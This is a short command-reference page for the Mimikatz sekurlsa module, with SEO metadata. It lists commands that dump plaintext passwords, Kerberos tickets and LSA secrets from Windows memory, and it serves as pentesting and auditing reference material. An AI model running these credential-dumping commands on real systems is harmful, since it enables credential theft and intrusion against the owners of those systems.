---
title: "Extract Mimikatz Secrets - Dump Credentials | Online Free DevTools by Hexmos"
name: mimikatz-sekurlsa
path: /freedevtools/tldr/windows/mimikatz-sekurlsa
canonical: "https://hexmos.com/freedevtools/tldr/windows/mimikatz-sekurlsa/"
description: "Extract passwords with Mimikatz sekurlsa. Dump credentials, secrets, and Kerberos tickets from Windows memory. Free online tool, no registration required."
category: windows
keywords:
- windows credential extraction
- mimikatz password dump
- sekurlsa password recovery
- lsa secrets dump
- kerberos ticket retrieval
- windows memory analysis
- plaintext password extraction
- windows security auditing
- local security authority secrets
- windows pentesting
features:
- Extract plaintext passwords from memory
- List Kerberos tickets stored in memory
- Dump LSA secrets and credentials
- Analyze Windows security protocols
- Retrieve sensitive information from memory dumps
ogImage: "https://hexmos.com/freedevtools/t/tool-banners/json-utilities-banner.png"
twitterImage: "https://hexmos.com/freedevtools/t/tool-banners/json-utilities-banner.png"
---

# mimikatz sekurlsa

> Extract credentials and secrets from memory.
> Requires debug privileges.
> More information: <https://github.com/gentilkiwi/mimikatz>.

- Extract plaintext passwords:

`mimikatz "sekurlsa::logonpasswords"`

- List Kerberos tickets in memory:

`mimikatz "sekurlsa::tickets"`

- Dump LSA secrets:

`mimikatz "sekurlsa::secrets"`
